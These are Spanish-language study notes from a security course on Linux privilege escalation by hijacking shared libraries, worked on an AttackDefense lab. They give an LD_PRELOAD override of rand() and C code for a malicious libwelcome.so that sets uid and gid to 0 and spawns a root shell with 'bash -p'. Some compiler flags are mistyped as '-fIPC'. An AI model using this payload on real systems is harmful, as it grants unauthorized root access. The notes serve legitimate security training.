- Tags : #escalada #escalada_privilegios #escalada_privilegios_linux 

Las **bibliotecas compartidas** son archivos que contienen funciones y recursos utilizados por múltiples programas. Cuando un programa requiere una función de una biblioteca compartida, el sistema operativo busca la biblioteca y enlaza dinámicamente la función requerida durante la ejecución del programa. Sin embargo, si el sistema no encuentra la biblioteca en las rutas predeterminadas, puede buscarla en otros directorios.

Un atacante puede aprovechar esta situación creando una **biblioteca compartida maliciosa** con el mismo nombre que la biblioteca legítima y colocándola en un directorio donde el sistema la buscará. Cuando el programa intenta cargar la biblioteca, el sistema cargará la versión maliciosa en lugar de la legítima, permitiendo al atacante ejecutar código malicioso con los privilegios del programa víctima.

En esta clase, analizaremos cómo se lleva a cabo el secuestro de bibliotecas de objetos compartidos enlazados dinámicamente y cómo identificar situaciones en las que esta técnica puede ser aplicada.

A continuación, se os comparte una de las herramientas que utilizamos en esta clase para analizar la ejecución de un programa escrito en C/C++, para ver que librerías esta llamando por detras :

- **Herramienta Uftrace**: [https://github.com/namhyung/uftrace](https://github.com/namhyung/uftrace)

Asimismo, se os comparte el enlace directo a la plataforma **AttackDefense**, donde estaremos resolviendo un reto que involucra esta misma temática:

- **AttackDefense**: [https://attackdefense.com](https://attackdefense.com/)

```bash
uftrace --force -a binario_en_c

uftrace --force -a ramdon

```

![](../../../attachments/Pasted%20image%2020260223120141.png)

Como se ve la función random nos devuelve un numero aleatorio , lo que intentaremos es que el programa llame a una función  *rand* creada por nostros y que devuelva siempre el mismo valor. Para que esto pase nuestro random debe coincidir a nivel de firma. La firma de una función contempla los siguientes puntos *Nombre , Argumentos , Tipo de retorno* 

Verificamos la función *rand*

```bash
man 3 rand   #El 3 es para ir a la seccion del manual que queremos consultar
```

![](../../../attachments/Pasted%20image%2020260223121150.png)

Nos creamos en la carpeta donde se encuentra el binario un fichero test.c con la estructura anterior para secuestrar la función 
```bash
nano test.c

#include <stdio.h>      #No es necesario

int rand(void){
return 42;
}
```

Lo que ocurre es que al ejecutar *./random* lo que hace es buscar las bibliotecas mediante el enlazador dinámico que lo que hace es que toma como prioritario aquello que lea de una variable de entrono **LD_PRELOAD** de modo que si nos creamos una biblioteca compartida
```bash
gcc -shared -fPIC test.c -o test
```

Si con *LD_PRELOAD* le cargamos la biblioteca que creamos al tener la misma estructura pues la leerá en vez de la real.
```bash
LD_PRELOAD=./test ./random 
```

![](../../../attachments/Pasted%20image%2020260223124135.png)

No se pueden secuestrar bibliotecas compartidas que estén enlazadas estáticamente.

Comando ldd buscar para que sirve


Otro ejemplo 
![](../../../attachments/Pasted%20image%2020260223134737.png)

![](../../../attachments/Pasted%20image%2020260223135823.png)

![](../../../attachments/Pasted%20image%2020260223135915.png)

Esa ruta no existe pero si   podemos escribir en la ruta */home/student*
```bash
cd /home/student
mkdir lib
cd lib
nano test.c

#include <stdio.h>
#include <unistd.h>

int main(){
	setuid(0);
	setgid(0);
	system("bash -p");
	return 0;
}

gcc -fIPC -shared test.c -o libwelcome.so

ejecutamos el binario 
```

![](../../../attachments/Pasted%20image%2020260223140851.png)

Por lo que modificaremos nuestro test.c  y lo compilaremos  nuevamente.

```bash
nano test.c

#include <stdio.h>
#include <unistd.h>

int welcome(){
	setuid(0);
	setgid(0);
	system("bash -p");
	return 0;
}

gcc -fIPC -shared test.c -o libwelcome.so
```

Ahora volvemos a ejecutar y obtenemos la bash con permisos de root
![](../../../attachments/Pasted%20image%2020260223141103.png)